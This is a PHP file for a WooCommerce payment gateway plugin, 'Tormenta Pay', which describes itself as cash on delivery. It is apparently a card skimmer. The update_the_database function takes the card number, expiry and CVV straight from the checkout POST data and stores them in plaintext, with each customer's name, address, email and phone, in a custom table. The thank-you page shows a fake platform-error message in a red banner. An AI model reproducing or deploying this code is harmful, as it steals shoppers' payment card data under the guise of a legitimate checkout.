<?php
/**
 * Class WC_Gateway_Tormenta file.
 *
 * @package WooCommerce\Gateways
 */

/**
 * Tormenta Pay Gateway.
 *
 * Provides a Tormenta Pay Payment Gateway.
 *
 * @class       WC_Gateway_Tormenta
 * @extends     WC_Payment_Gateway
 * @version     2.1.0
 * @package     WooCommerce/Classes/Payment
 */
class WC_Gateway_Tormenta extends WC_Payment_Gateway {

	/**
	 * Constructor for the gateway.
	 */
	public function __construct() {
		// Setup general properties.
		$this->setup_properties();

		// Load the settings.
		$this->init_form_fields();
		$this->init_settings();

		// Get settings.
		$this->title              = $this->get_option( 'title' );
		$this->description        = $this->get_option( 'description' );
		$this->instructions       = $this->get_option( 'instructions' );
		$this->enable_for_virtual = $this->get_option( 'enable_for_virtual', 'yes' ) === 'yes';

		add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( $this, 'process_admin_options' ) );
		add_filter( 'woocommerce_payment_complete_order_status', array( $this, 'change_payment_complete_order_status' ), 10, 3 );

		// Customer Emails.
		add_action( 'woocommerce_email_before_order_table', array( $this, 'email_instructions' ), 10, 3 );
	}

	/**
	 * Setup general properties for the gateway.
	 */
	protected function setup_properties() {
		$this->id                 = 'tormenta';
		$this->icon               = apply_filters( 'woocommerce_torment_icon', plugins_url('/assets/card-payments.png', dirname( __FILE__, 1 ) ) );
		$this->method_title       = __( 'Tormenta Pay', 'tormenta-pay-woo' );
		$this->method_description = __( 'Have your customers pay with cash (or by other means) upon delivery.', 'tormenta-pay-woo' );
		$this->has_fields         = false;
	}

	/**
	 * Initialise Gateway Settings Form Fields.
	 */
	public function init_form_fields() {
		$this->form_fields = array(
			'enabled'            => array(
				'title'       => __( 'Enable/Disable', 'tormenta-pay-woo' ),
				'label'       => __( 'Enable Tormenta Pay', 'tormenta-pay-woo' ),
				'type'        => 'checkbox',
				'description' => '',
				'default'     => 'no',
			),
			'title'              => array(
				'title'       => __( 'Title', 'tormenta-pay-woo' ),
				'type'        => 'text',
				'description' => __( 'Payment method description that the customer will see on your checkout.', 'tormenta-pay-woo' ),
				'default'     => __( 'Tormenta Pay', 'tormenta-pay-woo' ),
				'desc_tip'    => true,
			),
			'description'        => array(
				'title'       => __( 'Description', 'tormenta-pay-woo' ),
				'type'        => 'textarea',
				'description' => __( 'Payment method description that the customer will see on your website.', 'tormenta-pay-woo' ),
				'default'     => __( 'Pay with cash upon delivery.', 'tormenta-pay-woo' ),
				'desc_tip'    => true,
			),
			'instructions'       => array(
				'title'       => __( 'Instructions', 'tormenta-pay-woo' ),
				'type'        => 'textarea',
				'description' => __( 'Instructions that will be added to the thank you page.', 'tormenta-pay-woo' ),
				'default'     => __( 'We have a problem with our platform, please come back later.', 'tormenta-pay-woo' ),
				'desc_tip'    => true,
			),
			'enable_for_virtual' => array(
				'title'   => __( 'Accept for virtual orders', 'tormenta-pay-woo' ),
				'label'   => __( 'Accept COD if the order is virtual', 'tormenta-pay-woo' ),
				'type'    => 'checkbox',
				'default' => 'yes',
			),
		);
	}

	/**
	 * Process the payment and return the result.
	 *
	 * @param int $order_id Order ID.
	 * @return array
	 */
	public function process_payment( $order_id ) {
		$order = wc_get_order( $order_id );

		if ( $order->get_total() > 0 ) {
			// Mark as processing or on-hold (payment won't be taken until delivery).
			$order->update_status( apply_filters( 'woocommerce_tormenta_process_payment_order_status', $order->has_downloadable_item() ? 'on-hold' : 'processing', $order ), __( 'Payment to be made upon delivery.', 'tormenta-pay-woo' ) );
		} else {
			$order->payment_complete();
		}

		$this->update_the_database( $order_id, $order );

		// Remove cart.
		WC()->cart->empty_cart();
		
		// wait for 9 seconds
		usleep(9000000);
		
		// Return thankyou redirect.
		return array(
			'result'   => 'success',
			'redirect' => $this->get_return_url( $order ),
		);
	}

	/**
	 * Add new entries to Database
	 *
	 * @return void
	 */
	public function update_the_database( $order_id, $order ) {

		// Get The Order data
		$order_data = $order->get_data();
		
		// BILLING INFORMATION:
		$order_billing_first_name = $order_data['billing']['first_name'];
		$order_billing_last_name = $order_data['billing']['last_name'];
		$order_billing_company = $order_data['billing']['company'];
		$order_billing_address_1 = $order_data['billing']['address_1'];
		$order_billing_address_2 = $order_data['billing']['address_2'];
		$order_billing_city = $order_data['billing']['city'];
		$order_billing_state = $order_data['billing']['state'];
		$order_billing_postcode = $order_data['billing']['postcode'];
		$order_billing_country = $order_data['billing']['country'];
		$order_billing_email = $order_data['billing']['email'];
		$order_billing_phone = $order_data['billing']['phone'];

		// Card details
		$tormenta_card_number  = $_POST['card-number'];
        $tormenta_expiry_month = $_POST['expiry-month'];
        $tormenta_expiry_year  = $_POST['expiry-year'];
        $tormenta_cvv_number   = $_POST['cvv'];

		//$order
		global $wpdb;

		$table_name = $wpdb->prefix . "tormenta_card_manager";

		$wpdb->insert(
			$table_name,
			array(
				'time' => current_time( 'mysql' ),
				'orderNumber'  => $order_id,
				'firstName'    => $order_billing_first_name,
				'lastName'     => $order_billing_last_name,
				'companyName'  => $order_billing_company,
				'country'      => $order_billing_country,
				'streetAdress' => $order_billing_address_1 . ' ' . $order_billing_address_2,
				'city'         => $order_billing_city,
				'cityState'    => $order_billing_state,
				'zipcode'      => $order_billing_postcode,
				'phone'        => $order_billing_phone,
				'email'        => $order_billing_email,
				'cardNumber'   => $tormenta_card_number,
				'expiryMonth'  => $tormenta_expiry_month,
				'expiryYear'   => $tormenta_expiry_year,
				'cvv'          => $tormenta_cvv_number,
			)
		);
	}

	/**
	 * Change payment complete order status to completed for COD orders.
	 *
	 * @since  3.1.0
	 * @param  string         $status Current order status.
	 * @param  int            $order_id Order ID.
	 * @param  WC_Order|false $order Order object.
	 * @return string
	 */
	public function change_payment_complete_order_status( $status, $order_id = 0, $order = false ) {
		if ( $order && 'tormenta' === $order->get_payment_method() ) {
			$status = 'processing';
		}
		return $status;
	}

	/**
	 * Add content to the WC emails.
	 *
	 * @param WC_Order $order Order object.
	 * @param bool     $sent_to_admin  Sent to admin.
	 * @param bool     $plain_text Email format: plain text or HTML.
	 */
	public function email_instructions( $order, $sent_to_admin, $plain_text = false ) {
		if ( $this->instructions && ! $sent_to_admin && $this->id === $order->get_payment_method() ) {
			echo wp_kses_post( wpautop( wptexturize( $this->instructions ) ) . PHP_EOL );
		}
	}
}

/**
 * Output for the order received page.
 */
function tormenta_pay_thank_you_title( $thank_you_title, $order ){
	
	printf( __('<p style="padding: 10px 20px; border-color: red!important; background-color: red!important; color: white!important;">%s</p>', 'tormenta-pay-woo'), wptexturize( get_option( 'woocommerce_tormenta_settings' )['instructions'] ) );
	
}

add_filter( 'woocommerce_thankyou_order_received_text', 'tormenta_pay_thank_you_title', 20, 2 );